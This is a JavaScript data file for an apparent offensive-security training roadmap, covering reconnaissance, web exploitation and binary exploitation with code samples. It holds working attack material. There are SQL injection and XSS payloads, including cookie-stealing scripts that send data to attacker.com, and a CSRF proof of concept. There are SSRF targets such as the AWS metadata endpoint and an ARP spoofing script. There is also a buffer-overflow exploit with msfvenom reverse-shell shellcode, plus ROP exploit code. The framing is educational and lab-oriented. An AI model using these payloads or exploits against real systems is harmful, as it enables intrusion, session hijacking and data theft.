const hackingData = {
  name: "OFFENSIVE SECURITY & PENETRATION TESTING",
  area: "hack",
  eyebrow: "Ethical Hacking · Red Teaming · Exploit Development",
  sub: "Think like an attacker to defend like a professional. From reconnaissance to privilege escalation, from web exploitation to binary exploitation. Master the offensive mindset and techniques used by real adversaries.",
  phases: [
    {
      name: "Foundations of Ethical Hacking",
      level: "foundation",
      tagline: "The hacker methodology",
      desc: "Before you exploit, understand the legal, ethical, and technical foundations. Every successful attack follows a methodology: reconnaissance, scanning, exploitation, post-exploitation, and persistence.",
      topics: [
        {
          name: "Linux & Command Line Mastery",
          tag: "core",
          desc: "Kali Linux, Parrot OS, Ubuntu. Shell basics: bash, zsh. File system navigation, permissions (chmod, chown), process management (ps, top, kill, pkill), networking (ss, netstat, lsof, nc). Text processing: grep, awk, sed, cut, sort, uniq. Package management (apt, yum, pacman). Systemd (systemctl, journalctl).",
          master: [
            "Navigate file system and manipulate files using only the command line",
            "Use grep with regex to extract IP addresses from logs",
            "Write a bash script to automate reconnaissance tasks",
            "Understand Linux file permissions: rwx, SUID, SGID, sticky bit",
            "Use netcat to create a reverse shell and bind shell",
            "Analyze running processes and kill malicious ones with pkill/kill",
            "Parse Apache logs using awk and cut to find suspicious patterns"
          ],
          code: "#!/bin/bash\n# Port scanner using bash (for learning — use nmap in production)\n# Usage: ./portscan.sh 192.168.1.1 1-1000\n\nTARGET=$1\nPORT_RANGE=$2\n\nIFS='-' read -r START END <<< \"$PORT_RANGE\"\n\nfor PORT in $(seq $START $END); do\n    timeout 1 bash -c \"echo >/dev/tcp/$TARGET/$PORT\" 2>/dev/null && echo \"Port $PORT is open\"\ndone\n\n# One-liner to find SUID binaries (potential privilege escalation)\nfind / -perm -4000 -type f 2>/dev/null",
          res: [
            "Linux Command Line and Shell Scripting Bible",
            "Kali Linux Revealed (free PDF from Offensive Security)",
            "OverTheWire Bandit (wargame for command line practice)",
            "The Linux Command Line (William Shotts)"
          ]
        },
        {
          name: "Networking for Hackers",
          tag: "core",
          desc: "Network protocols from an attacker's perspective. TCP/IP stack attacks: SYN flood, TCP reset injection, session hijacking. ARP spoofing (man-in-the-middle). DNS attacks: spoofing, cache poisoning, tunneling. Wireshark and tcpdump for traffic analysis. Traceroute, netcat, socat.",
          master: [
            "Perform ARP spoofing with arpspoof or ettercap and capture traffic",
            "Analyze a PCAP file with Wireshark: filter for HTTP requests, extract images/files",
            "Use tcpdump to capture only SYN packets on port 443",
            "Execute a TCP SYN flood attack using hping3 (in lab environment only)",
            "Understand how DNS works: query types (A, AAAA, CNAME, MX, TXT)",
            "Set up a rogue DHCP server and understand DHCP starvation attacks",
            "Use socat to relay traffic between two hosts for MITM"
          ],
          code: "# Scapy script for ARP spoofing\ndef arp_spoof(target_ip, gateway_ip):\n    # Get MAC addresses\n    target_mac = get_mac(target_ip)\n    gateway_mac = get_mac(gateway_ip)\n    \n    # Craft ARP responses\n    target_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)\n    gateway_response = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)\n    \n    print(\"Starting ARP spoof...\")\n    try:\n        while True:\n            send(target_response, verbose=False)\n            send(gateway_response, verbose=False)\n            time.sleep(2)\n    except KeyboardInterrupt:\n        print(\"Restoring ARP tables...\")\n        restore(target_ip, gateway_ip, target_mac, gateway_mac)\n        print(\"Done.\")",
          res: [
            "Wireshark Network Analysis (Chappell)",
            "Practical Packet Analysis (Chris Sanders)",
            "Scapy documentation (scapy.readthedocs.io)",
            "TCP/IP Illustrated (Stevens) — attack perspective"
          ]
        },
        {
          name: "Web Technologies & HTTP Deep Dive",
          tag: "core",
          desc: "Every web app hack starts with HTTP knowledge. Methods (GET, POST, PUT, DELETE, PATCH, OPTIONS), status codes (2xx, 3xx, 4xx, 5xx), headers (Host, User-Agent, Cookie, Referer, X-Forwarded-For). Sessions vs tokens, cookies attributes (HttpOnly, Secure, SameSite). REST APIs, GraphQL. Burp Suite fundamentals.",
          master: [
            "Intercept and modify HTTP requests using Burp Suite Proxy",
            "Understand each HTTP method's security implications (PUT/DELETE often disabled)",
            "Explain HTTP vs HTTPS: SSL/TLS handshake, certificate validation",
            "Identify insecure cookie attributes in HTTP responses",
            "Use curl to craft custom HTTP requests with headers and body",
            "Analyze a REST API endpoint for IDOR vulnerabilities",
            "Understand HTTP/2 and HTTP/3 (QUIC) features and attack surface"
          ],
          code: "#!/bin/bash\n# Using curl for web reconnaissance\n\n# Basic GET request with custom headers\ncurl -H \"User-Agent: Mozilla/5.0\" -H \"X-Forwarded-For: 127.0.0.1\" https://target.com\n\n# POST request with JSON body\ncurl -X POST https://api.target.com/login \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"username\":\"admin\",\"password\":\"admin\"}'\n\n# Extract cookies and use in subsequent requests\ncurl -c cookies.txt https://target.com/login\ncurl -b cookies.txt https://target.com/dashboard\n\n# Test for HTTP methods\ncurl -X OPTIONS https://target.com/api/users -v\ncurl -X PUT https://target.com/api/users/1 -d '{\"role\":\"admin\"}' -H \"Content-Type: application/json\"",
          res: [
            "HTTP: The Definitive Guide (Gourley, Totty)",
            "Burp Suite documentation (PortSwigger)",
            "OWASP Web Security Testing Guide",
            "MDN Web Docs: HTTP (developer.mozilla.org)"
          ]
        }
      ]
    },
    {
      name: "Reconnaissance & Scanning",
      level: "intermediate",
      tagline: "Know your target better than they know themselves",
      desc: "Passive reconnaissance (OSINT) and active scanning (nmap, masscan). The more you know about your target before the exploit, the higher your success rate.",
      topics: [
        {
          name: "OSINT — Open Source Intelligence",
          tag: "core",
          desc: "Gathering information from public sources: DNS enumeration (dig, nslookup, dnsrecon), subdomain discovery (Sublist3r, Amass, assetfinder), WHOIS lookups, Shodan (searching for exposed devices), Censys, Google dorking, GitHub dorks, social media intelligence, theHarvester for email enumeration, Recon-ng framework.",
          master: [
            "Use dig to perform a DNS zone transfer (AXFR) if misconfigured",
            "Find subdomains using Amass and Sublist3r, then verify with httpx",
            "Search Shodan for exposed RDP servers on port 3389",
            "Use Google dorks: site, intitle, inurl, filetype, cache",
            "Extract email addresses from a domain using theHarvester",
            "Find sensitive info in GitHub repos using GitHub search and gitleaks",
            "Enumerate S3 buckets and test for public write access"
          ],
          code: "#!/bin/bash\n# Subdomain enumeration and validation\n\nTARGET=$1\n\necho \"[+] Enumerating subdomains for $TARGET\"\n\n# Using multiple tools\nsublist3r -d $TARGET -o subdomains.txt\namass enum -d $TARGET -o amass_subs.txt\n\n# Combine and sort\ncat subdomains.txt amass_subs.txt | sort -u > all_subs.txt\n\n# Check which subdomains are live\necho \"[+] Checking live subdomains...\"\ncat all_subs.txt | httpx -status-code -title -tech-detect -o live_subs.txt\n\n# One-liner for Google dorks (manual search)\necho \"Try these dorks manually:\"\necho \"  site:$TARGET filetype:pdf\"\necho \"  site:$TARGET inurl:admin\"\necho \"  site:$TARGET intitle:'index of'\"",
          res: [
            "OSINT Techniques (Michael Bazzell)",
            "TheHarvester GitHub repo",
            "Shodan Search Engine documentation",
            "Google Hacking Database (GHDB)"
          ]
        },
        {
          name: "Nmap Mastery",
          tag: "core",
          desc: "The network mapper. Host discovery (-sn), port scanning techniques (-sS SYN stealth, -sT connect, -sU UDP, -sA ACK for firewall rules), version detection (-sV), OS detection (-O), script engine (NSE scripts). Timing templates (-T0 to -T5). Output formats (-oA for all formats).",
          master: [
            "Perform a SYN stealth scan on a target: nmap -sS -p- -T4 target",
            "Use NSE scripts: --script vuln (vulnerability scanning), --script default (safe scripts)",
            "Perform UDP scan for DNS (53), SNMP (161), NTP (123)",
            "Detect service versions with -sV and aggressive OS detection -O --osscan-guess",
            "Scan an entire subnet with host discovery: nmap -sn 192.168.1.0/24",
            "Use --script http-enum to enumerate web directories",
            "Write a custom NSE script to check for a specific vulnerability"
          ],
          code: "# Common nmap commands\n\n# Comprehensive scan\nnmap -sC -sV -p- -T4 -oA full_scan target.com\n\n# Vulnerability scan\nnmap --script vuln -sV target.com\n\n# Firewall detection (ACK scan)\nnmap -sA target.com\n\n# Scan top 1000 ports with service detection\nnmap -sV --top-ports 1000 target.com\n\n# IPv6 scan\nnmap -6 -sS -p 80,443 2001:db8::1\n\n# Example NSE script structure (hello.nse)\n-- Script to check for open directory listing\naction = function(host, port)\n    local path = \"/\"\n    local response = http.get(host, port, path)\n    if response.status == 200 and response.body:match(\"Index of /\") then\n        return string.format(\"Open directory listing found at %s:%s%s\", host.ip, port.number, path)\n    end\nend",
          res: [
            "Nmap Network Scanning (Fyodor — free official guide)",
            "Nmap NSE documentation (nmap.org/nsedoc)",
            "Nmap in the Enterprise (Angela Orebaugh)",
            "Nmap Cheat Sheet (https://nmap.org/book/toc.html)"
          ]
        },
        {
          name: "Web Application Reconnaissance",
          tag: "core",
          desc: "Mapping web applications. Directory brute forcing (gobuster, dirb, dirsearch, ffuf), file extension fuzzing, parameter discovery. Technology stack detection (Wappalyzer, WhatWeb). CMS fingerprinting (wpscan for WordPress, droopescan for Drupal, JoomScan). API endpoint discovery.",
          master: [
            "Use gobuster with a wordlist to find hidden directories: gobuster dir -u target.com -w /usr/share/wordlists/dirb/common.txt",
            "Discover subdomains using ffuf with virtual host enumeration",
            "Use wpscan to enumerate WordPress users, plugins, and themes",
            "Fuzz parameters using ffuf or Burp Intruder to find hidden parameters",
            "Use WhatWeb to identify technologies: whatweb target.com",
            "Discover API endpoints using kiterunner or arjun",
            "Extract JavaScript files and analyze for endpoints and secrets"
          ],
          code: "#!/bin/bash\n# Web recon automation\n\nTARGET=$1\nWORDLIST=\"/usr/share/wordlists/dirb/common.txt\"\n\necho \"[+] Technology detection\"\nwhatweb $TARGET\necho \"\"\n\necho \"[+] Directory enumeration\"\ngobuster dir -u $TARGET -w $WORDLIST -t 50 -o dirs.txt\necho \"\"\n\necho \"[+] File extension fuzzing\"\nfor ext in php asp aspx jsp do cfm; do\n    gobuster dir -u $TARGET -w $WORDLIST -x $ext -o \"${ext}_files.txt\"\ndone\n\necho \"[+] Subdomain enumeration\"\nffuf -u \"http://FUZZ.$TARGET\" -w /usr/share/wordlists/subdomains.txt -o subdomains.txt\n\n# For WordPress\nif whatweb $TARGET | grep -qi \"wordpress\"; then\n    echo \"[+] WordPress detected, running wpscan\"\n    wpscan --url $TARGET --enumerate u,vp,vt\nfi",
          res: [
            "ffuf GitHub (ffuf.io)",
            "Gobuster documentation",
            "WPScan User Guide",
            "Web Application Hacker's Handbook (Stuttard, Pinto)"
          ]
        }
      ]
    },
    {
      name: "Web Application Exploitation",
      level: "advanced",
      tagline: "Breaking web apps systematically",
      desc: "OWASP Top 10 vulnerabilities and beyond. From injection to broken access control, from XSS to SSRF. Understand how to find and exploit these flaws in real applications.",
      topics: [
        {
          name: "SQL Injection",
          tag: "core",
          desc: "Manipulating SQL queries. In-band (error-based, union-based), blind (boolean-based, time-based), out-of-band (DNS/HTTP exfiltration). Bypassing WAFs (case variation, comments, URL encoding, hex encoding). Second-order injection. Automated tools: sqlmap.",
          master: [
            "Manually exploit a login bypass using ' OR 1=1 --",
            "Use UNION-based injection to extract database names, tables, columns",
            "Perform boolean blind injection by analyzing response differences",
            "Extract data via time-based blind injection: ' AND SLEEP(5) --",
            "Use sqlmap to automate detection and exploitation with --dbms, --level, --risk",
            "Bypass a WAF using URL encoding and comment injection",
            "Understand and exploit second-order SQL injection"
          ],
          code: "# Manual SQL injection examples\n\n# Login bypass\n' OR '1'='1' --\nadmin' --\n\n# Union-based extraction (numeric parameter)\n' UNION SELECT database(), user(), version() --\n\n# Extract table names\n' UNION SELECT table_name, NULL FROM information_schema.tables --\n\n# Blind boolean (true condition)\n' AND SUBSTRING(database(),1,1) = 'a' --\n\n# Time-based blind\n' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0) --\n\n# Sqlmap command\nsqlmap -u \"http://target.com/page?id=1\" --dbs --batch\nsqlmap -u \"http://target.com/page?id=1\" -D database_name --tables\nsqlmap -u \"http://target.com/page?id=1\" -D database_name -T users --dump",
          res: [
            "SQL Injection (Robert Hansen, Jeremiah Grossman)",
            "The SQL Injection Bible (PentesterLab)",
            "sqlmap documentation (sqlmap.org)",
            "PortSwigger Web Security Academy — SQL injection labs"
          ]
        },
        {
          name: "Cross-Site Scripting (XSS)",
          tag: "core",
          desc: "Injecting malicious scripts into web pages. Types: Reflected (non-persistent), Stored (persistent), DOM-based (client-side). Contexts: HTML context (tag injection, attribute injection), JavaScript context (string injection, eval injection), CSS context. Evasion techniques. XSS to session hijacking, CSRF bypass, keylogging.",
          master: [
            "Craft a reflected XSS payload: <script>alert('XSS')</script>",
            "Bypass HTML encoding with event handlers: <body onload=alert(1)>",
            "Use DOM-based XSS by manipulating window.location.hash",
            "Steal cookies with XSS: <script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>",
            "Perform XSS to CSRF: send authenticated request to change password",
            "Bypass CSP (Content Security Policy) with unsafe-inline or JSONP endpoints",
            "Use XS-Leaks techniques for cross-site information leakage"
          ],
          code: "<!-- XSS payload examples -->\n\n<!-- Basic alert -->\n<script>alert('XSS')</script>\n\n<!-- HTML attribute injection (no quotes) -->\n\" onmouseover=\"alert(1)\" \n\n<!-- JavaScript context injection (string) -->\n'; alert(1); var foo='\n\n<!-- DOM-based via hash -->\nhttp://target.com/#<img src=x onerror=alert(1)>\n\n<!-- Polyglot XSS (works in multiple contexts) -->\njaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n\n<!-- Steal cookies and redirect -->\n<script>new Image().src='http://attacker.com/steal?c='+document.cookie;location='http://target.com/login'</script>",
          res: [
            "XSS Prevention Cheat Sheet (OWASP)",
            "DOM-based XSS (PortSwigger Research)",
            "Exotic XSS Vectors (various write-ups)",
            "XSS Hunter (platform for blind XSS)"
          ]
        },
        {
          name: "SSRF, CSRF & IDOR",
          tag: "advanced",
          desc: "Broken access control vulnerabilities. SSRF (Server-Side Request Forgery): making internal requests from server, accessing metadata endpoints (AWS, GCP), port scanning internal networks. CSRF (Cross-Site Request Forgery): forcing authenticated requests via malicious site. IDOR (In-Direct Object Reference): accessing unauthorized resources by manipulating IDs.",
          master: [
            "Exploit SSRF to access AWS metadata: http://169.254.169.254/latest/meta-data/",
            "Use SSRF to scan internal network: try common internal IPs (10.0.0.1, 192.168.1.1)",
            "Bypass SSRF filters with redirects, DNS rebinding, alternative encodings",
            "Craft a CSRF POC that changes user email via a hidden form",
            "Bypass CSRF tokens by checking if token is predictable or missing",
            "Find IDOR by changing numeric IDs in URLs (user_id=1 to user_id=2)",
            "Use authorization header analysis to find JWT claims that can be forged"
          ],
          code: "<!-- CSRF POC (POST request) -->\n<html>\n<body>\n<form action=\"https://target.com/api/change-email\" method=\"POST\">\n    <input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\">\n</form>\n<script>\n    document.forms[0].submit();\n</script>\n</body>\n</html>\n\n<!-- IDOR testing examples -->\n# Change user ID\n/api/users/123/profile -> /api/users/124/profile\n\n# Encode IDs (try base64, hex)\n/api/users/MTIz -> base64 for 123\n\n# Change file names\n/download?file=invoice_123.pdf -> /download?file=../../config.php\n\n# SSRF test endpoints\nhttp://169.254.169.254/latest/meta-data/\nhttp://127.0.0.1:8080/admin\nhttp://localhost/phpinfo.php\nfile:///etc/passwd\n\n# SSRF with DNS rebinding (script)\n# 1. Register domain with TTL=0\n# 2. Return attacker IP, then switch to 127.0.0.1 after resolution",
          res: [
            "SSRF Bible (Wallarm)",
            "CSRF Prevention Cheat Sheet (OWASP)",
            "IDOR: The Vulnerability That Keeps on Giving (PortSwigger)",
            "HackTricks — SSRF tricks"
          ]
        }
      ]
    },
    {
      name: "Exploit Development & Binary Exploitation",
      level: "expert",
      tagline: "Turning vulnerabilities into code execution",
      desc: "The hardest core of offensive security. Buffer overflows, return-oriented programming (ROP), heap exploitation, kernel exploits. Master x86/x64 assembly, debugging with GDB, and modern mitigation bypasses.",
      topics: [
        {
          name: "Buffer Overflows & Stack Smashing",
          tag: "advanced",
          desc: "Classic stack-based buffer overflow. Understanding stack layout (saved return address, local variables, base pointer). Exploiting without mitigations: overwriting return address with shellcode address. NOP sleds. Little endian vs big endian. Environment variables for exploitation.",
          master: [
            "Write a C program vulnerable to stack overflow and exploit it",
            "Use GDB (pwndbg/gef) to examine the stack and find return address offset",
            "Generate shellcode with msfvenom: msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=4444 -f python",
            "Use a NOP sled (\\x90\\x90\\x90) for reliable exploitation",
            "Understand endianness: why 0xbffff7a0 becomes '\\xa0\\xf7\\xff\\xbf'",
            "Compile with ASLR disabled: echo 0 > /proc/sys/kernel/randomize_va_space",
            "Bypass stack canaries by brute-forcing or information leaks"
          ],
          code: "// Vulnerable C program\n#include <stdio.h>\n#include <string.h>\n\nvoid vulnerable(char *input) {\n    char buffer[64];\n    strcpy(buffer, input);  // No bounds checking!\n}\n\nint main(int argc, char **argv) {\n    if (argc != 2) {\n        printf(\"Usage: %s <input>\\n\", argv[0]);\n        return 1;\n    }\n    vulnerable(argv[1]);\n    printf(\"Returned safely\\n\");\n    return 0;\n}\n\n# Exploit script (Python)\nimport struct\n\n# msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f python\nbuf = b\"\"\nbuf += b\"\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\"\nbuf += b\"\\xcd\\x80\\x5b\\x5e\\x68\\x0a\\x00\\x00\\x01\\x66\\x68\\x11\\x5c\"\nbuf += b\"\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\x43\\xb0\"\nbuf += b\"\\x66\\xcd\\x80\\x87\\xdf\\xb0\\x66\\xb1\\x03\\xcd\\x80\\x52\\x52\"\nbuf += b\"\\x56\\x89\\xe1\\x43\\xb0\\x66\\xcd\\x80\\x93\\x59\\x6a\\x3f\\x58\"\nbuf += b\"\\xcd\\x80\\x49\\x79\\xf8\\x6a\\x0b\\x58\\x99\\x52\\x68\\x2f\\x2f\"\nbuf += b\"\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x53\\x89\\xe1\"\nbuf += b\"\\xcd\\x80\"\n\nnop_sled = b\"\\x90\" * 100\npadding = b\"A\" * 76  # Offset to return address\nret_addr = struct.pack(\"<I\", 0xbffff7a0)  # Address of buffer\n\npayload = nop_sled + buf + padding + ret_addr\n\nwith open(\"payload.bin\", \"wb\") as f:\n    f.write(payload)",
          res: [
            "The Shellcoder's Handbook (Chris Anley et al.)",
            "Smashing The Stack For Fun And Profit (Aleph One)",
            "Modern Binary Exploitation (RPI course)",
            "LiveOverflow YouTube channel (binary exploitation)"
          ]
        },
        {
          name: "Return-Oriented Programming (ROP)",
          tag: "expert",
          desc: "Bypassing NX (No-Execute) protection. Using existing code snippets (gadgets) ending in 'ret' to chain operations. ROP chain construction: pop registers, system calls (execve), function calls. ROPgadget, Ropper tools. x64 ROP: passing arguments via registers (rdi, rsi, rdx, r10, r8, r9).",
          master: [
            "Find ROP gadgets in a binary using ROPgadget: ROPgadget --binary ./vuln",
            "Construct a ROP chain to call execve('/bin/sh', NULL, NULL)",
            "Bypass ASLR using information leak to find libc base address",
            "Use ret2libc technique: overwrite return address with system() and argument",
            "Chain multiple gadgets: pop rdi; ret followed by address of '/bin/sh'",
            "Use one-gadget RCE from libc (one_gadget tool)",
            "Understand x64 calling convention: first argument in RDI, second in RSI, third in RDX"
          ],
          code: "# ROP exploitation example (Python with pwntools)\nfrom pwn import *\n\n# Set up binary and libc\nbinary = ELF('./vuln')\nlibc = ELF('./libc.so.6')\n\n# Find ROP gadgets\npop_rdi = 0x4007c3  # pop rdi; ret\npop_rsi = 0x4007c1   # pop rsi; pop r15; ret\n\n# Addresses\nsystem = libc.symbols['system']\nbinsh = next(libc.search(b'/bin/sh'))\n\n# ROP chain\nrop_chain = p64(pop_rdi) + p64(binsh) + p64(system)\n\n# Payload\npayload = b'A' * 40 + rop_chain\n\n# Exploit\np = process('./vuln')\np.sendline(payload)\np.interactive()\n\n# One-gadget example\n# one_gadget libc.so.6\n# 0x4f2c5 execve(\"/bin/sh\", rsp+0x40, environ)\n# Use with offset to libc base",
          res: [
            "Return-Oriented Programming: Systems, Languages, and Applications (Shacham 2007)",
            "The Geometry of Innocent Flesh on the Bone (ROP paper)",
            "pwntools documentation (docs.pwntools.com)",
            "ROPgadget tool documentation"
          ]
        },
        {
          name: "Heap Exploitation",
          tag: "expert",
          desc: "Exploiting dynamic memory allocators. ptmalloc2 internals: chunks (size, prev_size, fd, bk), bins (fastbins, unsorted, small, large). Use-after-free (UAF), double free, heap overflow (poison null byte). tcache exploitation (modern glibc). House of Force, House of Spirit, House of Orange techniques.",
          master: [
            "Understand chunk structure: size (low 3 bits for flags: PREV_INUSE, IS_MMAPPED, NON_MAIN_ARENA)",
            "Exploit use-after-free by calling function pointer from freed chunk",
            "Perform double free attack: free same chunk twice to cause memory corruption",
            "Use tcache poisoning to allocate arbitrary memory addresses",
            "Understand fastbin dup: overlapping chunks via double free in fastbins",
            "Exploit heap overflow to overwrite adjacent chunk's size and metadata",
            "Implement House of Force to bypass ASLR on heap"
          ],
          code: "# Vulnerable heap example\n#include <stdlib.h>\n#include <string.h>\n#include <stdio.h>\n\nint main() {\n    char *ptr1 = malloc(32);\n    char *ptr2 = malloc(32);\n    \n    strcpy(ptr1, \"AAAA\");\n    free(ptr1);\n    \n    // Use-after-free\n    strcpy(ptr1, \"BBBB\");  // ptr1 is already freed!\n    \n    // Double free\n    free(ptr1);  // Double free! (if ptr1 not NULL after first free)\n    \n    return 0;\n}\n\n# Heap exploitation with tcache poisoning (simplified)\n# Step 1: Fill tcache for a size (7 chunks)\n# Step 2: Free another chunk (goes to fastbin)\n# Step 3: Overwrite fd pointer of fastbin chunk\n# Step 4: Allocate from tcache to move fastbin chunk to tcache\n# Step 5: Allocate to get pointer at overwritten address",
          res: [
            "How the Heap Works (Azeria Labs)",
            "Heap Exploitation (shellphish how2heap repository)",
            "Glibc Heap Internals (Ariane Blondel)",
            "Linux Heap Exploitation (FuzzySecurity)"
          ]
        }
      ]
    }
  ]
};